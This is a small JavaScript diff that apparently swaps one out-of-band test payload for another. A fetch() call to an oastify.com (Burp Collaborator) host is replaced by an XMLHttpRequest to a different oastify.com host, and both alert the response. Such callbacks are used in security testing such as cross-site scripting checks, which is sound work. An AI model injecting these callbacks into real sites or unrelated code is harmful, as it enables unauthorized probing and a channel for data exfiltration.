@@ -1,8 +1,6 @@
-    fetch("//as6puyobkfflc2idxp8m5352nttkhbdz2.oastify.com/?")
-        .then(response => response.text())
-        .then(data => {
-            alert("Source Code:\n" + data);
-        })
-        .catch(error => {
-            console.error("Error:", error);
-        });
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', 'https://qoivowun9nw5ocj9c1q8mx5qghm8a2yr.oastify.com', true);
+    xhr.onload = function() {
+        alert(xhr.responseText);
+    };
+    xhr.send();
